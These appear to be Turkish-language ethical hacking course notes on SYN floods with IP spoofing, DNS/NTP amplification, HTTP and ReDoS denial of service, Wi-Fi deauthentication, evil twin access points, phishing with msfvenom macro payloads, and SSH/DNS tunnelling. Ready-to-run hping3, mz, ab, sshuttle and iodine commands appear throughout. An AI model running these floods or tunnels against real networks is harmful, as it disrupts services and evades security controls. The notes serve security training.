## DOS

**- SYN Flood:** Hedefin açık portlarına SYN paketleri gönderip karşı hedefin Stack Table'ını doldurmak. 

**- Stack Table:** TCP protokolüyle yapılan haberleşmelerin bulunduğu tablodur.	(netstat ile görebiliriz.)

**- SYN Flood'u başarılı kılan şeyler:** SYN paketinin küçük olması, fazla sayıda paketi kısa sürede oluşturabilmemizi sağlar. 

**- IP Spoofing:** Başka bir kaynak IP adresi ile hedefe SYN yollarsak, hedef syn+ack paketini spoof ettiğimiz adrese döner. Spoof ettiğimiz adres ise cevap döndürmez. Bu sayede gizliliğimizi de sağlamış oluruz.

	A=> hping -S <HEDEF_IP> -p <HEDEF_PORT> 
	A=> hping3 -S -a 8.8.8.8 <HEDEF_IP> -p <HEDEF_PORT>
	A=> hping3 -S --rand-source <HEDEF_IP> -p <HEDEF_PORT>
	A=> hping3 -S --rand-source <HEDEF_IP> -p <HEDEF_PORT> --flood &
	T=> tcpdump -nn -i em0 tcp port <HEDEF_PORT>

## Amplification

- 100MBit'lik bir internet ile çok daha fazla bandwith'e sahipmişiz gibi DOS saldırıları yapmamızı sağlar.

- DNS sunucuları iki çeşitli çalışır. Recursive veya Authoritative. Recursive DNS sunucuları her soruya cevap verir. Authoritative DNS sunucuları ise vermez.

- DNS genelde UDP ile 53 üzerinde çalışır. UDP'de herhangi bir kontrol mekanizması olmadığı için spoofing yaparak paket yollayabiliriz. DNS sunucularına hedefi taklit ederek, sonuçları büyük boyutlarda olacak istekler yollarız. DNS sunucuları, hedefimize bu isteklerin cevaplarını yollayarak hedefi servis dışı bırakır.

		=> dig @8.8.8.8 google.com any		(388 byte'lık bir cevap döndürdü.)

- Saldırı için kendi domain'imize maximum sayıda kayıt ekleyerek kendi domain'imiz ile de bu saldırıyı yapabiliriz.

		A=> mz eth0 -A cehturkiye.com -B 8.8.8.8 -t dns "dp=53, q=google.com.tr" -c 0
		
		T=> tcpdump -nn -i em0 udp port 53
		(A: Attacker, T: Target)

- Saldırgan saldırının başarılı olup olmadığında siteye girerek bakarsa, o anın log'unu alarak saldırganın gerçek IP adresine ulaşabiliriz. Diğer türlü gelen paketleri inceleyerek hedefin asıl kaynağını bulmak çok zor ve uzun zaman alacak olan bir iş olabilir. Ya da başarısız olabilir.

- NTP UDP 123: Timestamp isteğini 40-50byte'lik paketlerle yollarız. Dönen paket 100byte civarı döner.

## Web Servislerine Yönelik Saldırılar

**- CAPTCHA örneği:** Hedef captcha'ya maksimum ne kadar büyüklükte bir fotoğraf üreteceğini belirtmediyse çok büyük boyutlarda fotoğraf boyutları isteyen GET paketleriyle hedefi çökertmek.

**- ReDoS:** Hedefte arama kısmında regexp kullanabiliyorsak, hedefin çok uzun sürelerde işlem yapmasını sağlayarak hedefi düşürmek.	(tool => ab)

- Aşağıdaki saldırıda HTTP oturumunu kurabilmemiz için TCP bağlantısını yapmamız gerek. Bu yüzden IP Spoofing yapamayız.

		T=> tail -f /var/log/cehturkiye-access-log
	
		A=> ab -r -n 10000000 -c 100 http://www.cehturkiye.com

- Botnet saldırılarından kullanıcılara ek bir cookie vererek kurtulma yöntemi: Botnet'ler birinci istekten sonra sadece URL'i isteyip cookie'leri kullanmadılarsa DDOS'cular demektir. Bu IP'leri engelleyerek saldırı önlenebilir.

**- TOOLS:** Jmeter, ddosim(botnet saldırıları simüle eder.) diğer adı: bonesi.

## Kablosuz Ağlar

- WPA nasıl çalışır?

	- AP'ler her makineye özgün bir hash üretir. Biz de o hash + parola => WPA anahtarını oluşturur ve AP'ye göndeririz. O da aynı hash + parola hesabını yapar ve ikisi de aynıysa bağlantıyı onaylar. Dışarıdan bir saldırgan hash ve wpa anahtarını görür ancak bunu tersine döndürmesi teorik ve pratik olarak imkansızdır. Aradaki parola değerini bruteforce yaparak parolayı bulmaya çalışır.

- Kablosuz ağlardaki zayıf nokta: Kablosuz ağa bağlı olmadan, kablosuz ağa bağlı olan kişilerin MAC adreslerini görebiliriz. Bu sayede AP'yi taklit ederek veya Client'i taklit ederek DEAUTH paketleri oluşturulabiliriz. Bu da kablosuz ağdaki client'leri düşürmemizi sağlar. 

		A=> airmon-ng
		A=> airodump-ng

- BSSID'nin (not associated) olması, oradaki client'ın daha önce bir ağa bağlanmış olan ve şu anda bağlanmak için bir ağ arayan cihazları temsil eder.

**- TOOL:** wifijammer, pyrit

	=> grep -irn ahmet /usr/share/wordlists/rockyou.txt		(rockyou.txt içerisinde ahmet geçen kelimeleri gösterir.)

## Fake AP

**- İkiz Şeytan Saldırısı(EvilTwins):** easy-creds, wifi-pumpkin

- dns2proxy

## Sosyal Mühendislik

**- TOOLS:** sees.py

- LinkedIN PRO hesabı tarzı kurumsal hediye vaadi veren mailler veya bilgi teknolojilerinden gelen yaptırımsal ve aciliyet içeren mailler yüksek tıklanma oranlarına sahiptir.

- Msfvenom ile makro payload'ları oluşturarak word veya excel dosyalarını karşı tarafa yollamak ve reverse shell veya bind shell bağlantıları elde etmek.

## SSH Tünelleme

- TCP verisini SSH içerisinden geçirerek web filtrelerini vs. atlatmak.

**- TOOLS:** sshuttle

	=> sshuttle -r user@IP:PORT 0.0.0.0/0

## DNS Tünelleme

- DNS Layer 7de genelde UDP üzerinden hizmet veren bir uygulama protokolüdür. DNS, kurumsal ağlarda genelde DC üzerinde integrated olarak kurulu olur. Kurumdaki client'lar DNS sunucusu olarak sadece DC üzerinde bulunan DNS sunucusuna sorgu yollayabilirler. Bunu atlatabilmek için yapılacak işlem şudur: DC'ye yapacağımız isteklerde subdomain isteklerinin arasına TCP payload'ları gömerek internete çıkarız.

**- TOOLS:** iodine

- Cloudflare üzerinden domain alıp subdomain'ler kuruyoruz ve bu subdomain'leri bir IP adresine yönlendiririz. Bu makinelere iodine kurarız. Ardından client'tan iodine kullanarak istek yollarız.

		=> iodine tunnel.meterpreter.net

- SSH tünelini DNS tüneli üzerinden geçirebiliriz. 

		DNS tüneli aktifken: => sshuttle -r user@IP:PORT 0.0.0.0/0
